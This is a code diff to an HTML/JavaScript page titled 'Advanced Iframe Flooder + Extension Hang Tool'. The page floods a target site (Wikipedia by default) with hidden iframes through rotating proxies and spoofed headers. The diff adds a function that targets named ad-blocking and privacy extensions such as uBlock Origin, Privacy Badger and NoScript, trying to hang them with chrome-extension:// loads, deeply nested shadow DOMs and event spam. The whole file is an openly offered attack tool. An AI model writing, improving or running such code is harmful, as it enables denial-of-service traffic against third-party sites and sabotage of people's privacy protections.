@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Advanced Iframe Flooder Tool</title>
+  <title>Advanced Iframe Flooder + Extension Hang Tool</title>
   <link rel="icon" href="favicon.ico" type="image/x-icon">
   <style>
     body {
@@ -26,7 +26,7 @@
       background: #333;
       padding: 20px;
       border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
       box-sizing: border-box;
     }
     .container label {
@@ -34,7 +34,7 @@
       margin-top: 10px;
       display: block;
     }
-    input, button, textarea {
+    input, button, select, textarea {
       width: 100%;
       padding: 12px;
       margin-top: 10px;
@@ -65,11 +65,9 @@
       color: #f44336;
       font-weight: bold;
     }
-    #iframeContainer {
-      display: none;
-    }
     #dashboard {
       background-color: #f1f1f1;
+      color: #333;
       padding: 15px;
       border-radius: 5px;
       margin-top: 20px;
@@ -80,20 +78,6 @@
     .stats span {
       font-weight: bold;
     }
-    .tooltip {
-      position: absolute;
-      background-color: #f9f9f9;
-      border: 1px solid #ccc;
-      padding: 5px;
-      font-size: 12px;
-      display: none;
-      border-radius: 4px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-    }
-    .input-group {
-      position: relative;
-      margin-bottom: 15px;
-    }
     @media (max-width: 768px) {
       .container {
         width: 100%;
@@ -102,141 +86,201 @@
     }
   </style>
 </head>
+
 <body>
 
-  <h1>Advanced Iframe Flooder Tool</h1>
+<h1>Advanced Iframe Flooder + Extension Hang Tool</h1>
 
-  <div class="container">
-    <div class="input-group">
-      <label for="targetUrl">Target URL:</label>
-      <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
-    </div>
-
-    <div class="input-group">
-      <label for="iframeCount">Number of Iframes:</label>
-      <input type="number" id="iframeCount" value="50" min="1">
-    </div>
-
-    <div class="input-group">
-      <label for="delay">Delay Between Iframes (seconds):</label>
-      <input type="number" id="delay" value="1" min="0">
-    </div>
-
-    <div class="input-group">
-      <label for="proxyList">Proxy List (comma separated):</label>
-      <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
-    </div>
-
-    <div class="input-group">
-      <label for="userAgentRotation">Enable User-Agent Rotation:</label>
-      <input type="checkbox" id="userAgentRotation">
-    </div>
-
-    <div class="input-group">
-      <label for="headers">Custom Headers (Optional):</label>
-      <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
-    </div>
-
-    <div class="input-group">
-      <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
-      <input type="number" id="autoStopTimer" value="60" min="0">
-    </div>
-
-    <button onclick="startFlood()">Start Flooding</button>
-    <button class="stop" onclick="stopFlood()">Stop Flooding</button>
-
-    <div class="status" id="status">Ready</div>
-
-    <div id="dashboard">
-      <h3>Flooding Stats</h3>
-      <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
-      <p class="stats">Failures: <span id="failureCount">0</span></p>
-      <p class="stats">Current Target: <span id="currentTarget">None</span></p>
-    </div>
+<div class="container">
+  <div class="input-group">
+    <label for="targetUrl">Target URL:</label>
+    <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
   </div>
 
-  <script>
-    let flooding = false;
-    let frameCount = 0;
-    let failureCount = 0;
-    let currentTarget = '';
-    let proxyList = [];
-    let userAgentRotation = false;
-    let currentProxyIndex = 0;
+  <div class="input-group">
+    <label for="iframeCount">Number of Iframes:</label>
+    <input type="number" id="iframeCount" value="50" min="1">
+  </div>
 
-    function startFlood() {
-      if (flooding) return;
-      flooding = true;
-      document.getElementById('status').innerText = "Flooding in progress...";
+  <div class="input-group">
+    <label for="delay">Delay Between Iframes (seconds):</label>
+    <input type="number" id="delay" value="1" min="0">
+  </div>
 
-      currentTarget = document.getElementById('targetUrl').value;
-      proxyList = document.getElementById('proxyList').value.split(',');
-      userAgentRotation = document.getElementById('userAgentRotation').checked;
+  <div class="input-group">
+    <label for="proxyList">Proxy List (comma separated):</label>
+    <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
+  </div>
 
-      const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
-      const delay = parseInt(document.getElementById('delay').value) * 1000;
+  <div class="input-group">
+    <label for="userAgentRotation">Enable User-Agent Rotation:</label>
+    <input type="checkbox" id="userAgentRotation">
+  </div>
 
-      floodIframes(currentTarget, delay, customHeaders);
-    }
+  <div class="input-group">
+    <label for="headers">Custom Headers (Optional):</label>
+    <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
+  </div>
 
-    function floodIframes(target, delay, customHeaders) {
-      const iframeCount = parseInt(document.getElementById('iframeCount').value);
-      for (let i = 0; i < iframeCount; i++) {
-        setTimeout(() => {
-          loadIframe(target, customHeaders);
-          frameCount++;
-          document.getElementById('frameCount').innerText = frameCount;
-        }, delay * i);
+  <div class="input-group">
+    <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
+    <input type="number" id="autoStopTimer" value="60" min="0">
+  </div>
+
+  <div class="input-group">
+    <label for="extensionTarget">Target Extension:</label>
+    <select id="extensionTarget">
+      <option value="all">All Extensions</option>
+      <option value="cfhdojbkjhnklbpkdaibdccddilifddb">AdBlock Plus</option>
+      <option value="cjpalhdlnbpafiamejdnhcphjbkeiagm">uBlock Origin</option>
+      <option value="gcbommkclmclpchllfjekcdonpmejbdp">Privacy Badger</option>
+      <option value="bkkmolkhemgaeaeggcmfbghljjjoofoh">Ghostery</option>
+      <option value="mlomiejdfkolichcflejclcbmpeaniij">NoScript</option>
+    </select>
+  </div>
+
+  <button onclick="startFlood()">Start Flooding</button>
+  <button class="stop" onclick="stopFlood()">Stop Flooding</button>
+
+  <div class="status" id="status">Ready</div>
+
+  <div id="dashboard">
+    <h3>Flooding Stats</h3>
+    <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
+    <p class="stats">Failures: <span id="failureCount">0</span></p>
+    <p class="stats">Current Target: <span id="currentTarget">None</span></p>
+  </div>
+</div>
+
+<script>
+let flooding = false;
+let frameCount = 0;
+let failureCount = 0;
+let currentTarget = '';
+let proxyList = [];
+let userAgentRotation = false;
+let currentProxyIndex = 0;
+let hangInterval = null;
+
+function startFlood() {
+  if (flooding) return;
+  flooding = true;
+  document.getElementById('status').innerText = "Flooding and Hanging Extensions...";
+
+  currentTarget = document.getElementById('targetUrl').value;
+  proxyList = document.getElementById('proxyList').value.split(',').map(p => p.trim()).filter(p => p);
+  userAgentRotation = document.getElementById('userAgentRotation').checked;
+
+  const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
+  const delay = parseInt(document.getElementById('delay').value) * 1000;
+
+  floodIframes(currentTarget, delay, customHeaders);
+  hangExtensions(); // Always on
+}
+
+function floodIframes(target, delay, customHeaders) {
+  const totalFrames = parseInt(document.getElementById('iframeCount').value);
+  for (let i = 0; i < totalFrames; i++) {
+    setTimeout(() => {
+      if (!flooding) return;
+      try {
+        loadIframe(target, customHeaders);
+        frameCount++;
+        document.getElementById('frameCount').innerText = frameCount;
+      } catch {
+        failureCount++;
+        document.getElementById('failureCount').innerText = failureCount;
       }
+    }, delay * i);
+  }
 
-      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
-      if (autoStopTime > 0) {
-        setTimeout(stopFlood, autoStopTime);
-      }
+  const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
+  if (autoStopTime > 0) {
+    setTimeout(stopFlood, autoStopTime);
+  }
+}
+
+function loadIframe(target, customHeaders) {
+  const iframe = document.createElement('iframe');
+  iframe.style.width = "0";
+  iframe.style.height = "0";
+  iframe.style.border = "none";
+
+  customHeaders.forEach(header => {
+    const [key, value] = header.split(':');
+    if (key && value) {
+      iframe.setAttribute(key.trim(), value.trim());
     }
+  });
 
-    function loadIframe(target, customHeaders) {
+  if (proxyList.length > 0) {
+    const proxy = proxyList[currentProxyIndex % proxyList.length];
+    iframe.src = proxy + '/' + target;
+    currentProxyIndex++;
+  } else {
+    iframe.src = target;
+  }
+
+  document.body.appendChild(iframe);
+  document.getElementById('currentTarget').innerText = target;
+}
+
+function hangExtensions() {
+  const selectedExtension = document.getElementById('extensionTarget').value;
+  
+  for (let i = 0; i < 300; i++) {
+    setTimeout(() => {
+      if (!flooding) return;
       const iframe = document.createElement('iframe');
-      iframe.src = target;
       iframe.style.width = "0";
       iframe.style.height = "0";
       iframe.style.border = "none";
 
-      // Apply custom headers if provided
-      customHeaders.forEach(header => {
-        const [key, value] = header.split(':');
-        if (key && value) {
-          iframe.setAttribute('X-Forwarded-For', value.trim());
-        }
-      });
-
-      // Proxy rotation and user-agent rotation
-      let proxy = proxyList[currentProxyIndex % proxyList.length];
-      if (userAgentRotation) {
-        let randomUserAgent = getRandomUserAgent();
-        iframe.setAttribute('User-Agent', randomUserAgent);
+      let targetExtensionId = selectedExtension;
+      if (selectedExtension === "all") {
+        targetExtensionId = randomExtensionId();
       }
 
-      iframe.setAttribute('src', proxy + '/' + target);
+      iframe.src = 'chrome-extension://' + targetExtensionId + '/_generated_background_page.html';
+
+      const shadowHost = document.createElement('div');
+      iframe.onload = () => {
+        const shadowRoot = shadowHost.attachShadow({mode: 'open'});
+        let deep = shadowRoot;
+        for (let j = 0; j < 50; j++) {
+          const newDiv = document.createElement('div');
+          deep.appendChild(newDiv);
+          deep = newDiv.attachShadow({mode: 'open'});
+        }
+      };
+
       document.body.appendChild(iframe);
-      currentProxyIndex++;
-      document.getElementById('currentTarget').innerText = target;
-    }
+    }, i * 20);
+  }
 
-    function getRandomUserAgent() {
-      const userAgents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
-      ];
-      return userAgents[Math.floor(Math.random() * userAgents.length)];
-    }
+  hangInterval = setInterval(() => {
+    if (!flooding) return;
+    window.dispatchEvent(new Event('resize'));
+    window.dispatchEvent(new Event('focus'));
+    window.dispatchEvent(new Event('blur'));
+  }, 50);
+}
 
-    function stopFlood() {
-      flooding = false;
-      document.getElementById('status').innerText = "Flooding stopped.";
-    }
-  </script>
+function stopFlood() {
+  flooding = false;
+  document.getElementById('status').innerText = "Flooding Stopped.";
+  if (hangInterval) clearInterval(hangInterval);
+}
+
+function randomExtensionId() {
+  const chars = 'abcdefghijklmnopqrstuvwxyz';
+  let id = '';
+  for (let i = 0; i < 32; i++) {
+    id += chars[Math.floor(Math.random() * chars.length)];
+  }
+  return id;
+}
+</script>
 
 </body>
 </html>
